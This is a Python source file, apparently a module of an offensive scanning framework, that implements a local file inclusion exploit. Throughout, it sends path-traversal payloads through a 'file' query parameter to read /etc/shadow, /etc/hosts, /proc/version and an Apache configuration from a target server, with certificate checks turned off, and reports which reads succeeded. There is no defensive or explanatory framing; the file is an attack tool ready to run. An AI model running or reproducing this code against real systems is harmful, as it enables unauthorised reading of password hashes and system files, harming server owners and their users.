#!/usr/bin/env python3

import requests
import logging
from urllib.parse import urljoin

logger = logging.getLogger(__name__)

def run(target_url, scan_result):
    """
    Run the LFI exploit module
    
    Args:
        target_url (str): Target URL
        scan_result (dict): Results from the scan
        
    Returns:
        dict: Exploit results
    """
    try:
        # Extract the vulnerable path from scan results
        vulnerable_path = scan_result['target_url']
        
        # Try to read additional sensitive files
        sensitive_files = [
            '/etc/shadow',
            '/etc/hosts',
            '/proc/version',
            '/etc/apache2/apache2.conf'
        ]
        
        results = []
        for file_path in sensitive_files:
            # Construct the LFI payload
            payload = f"../../../../{file_path}"
            url = urljoin(target_url, f"/?file={payload}")
            
            try:
                response = requests.get(url, timeout=5, verify=False)
                if response.status_code == 200:
                    results.append({
                        'file': file_path,
                        'status': 'success',
                        'content_length': len(response.text)
                    })
                else:
                    results.append({
                        'file': file_path,
                        'status': 'failed',
                        'status_code': response.status_code
                    })
            except Exception as e:
                results.append({
                    'file': file_path,
                    'status': 'error',
                    'error': str(e)
                })
        
        return {
            'success': True,
            'results': results
        }
        
    except Exception as e:
        logger.error(f"Exploit failed: {str(e)}")
        return {
            'success': False,
            'error': str(e)
        } 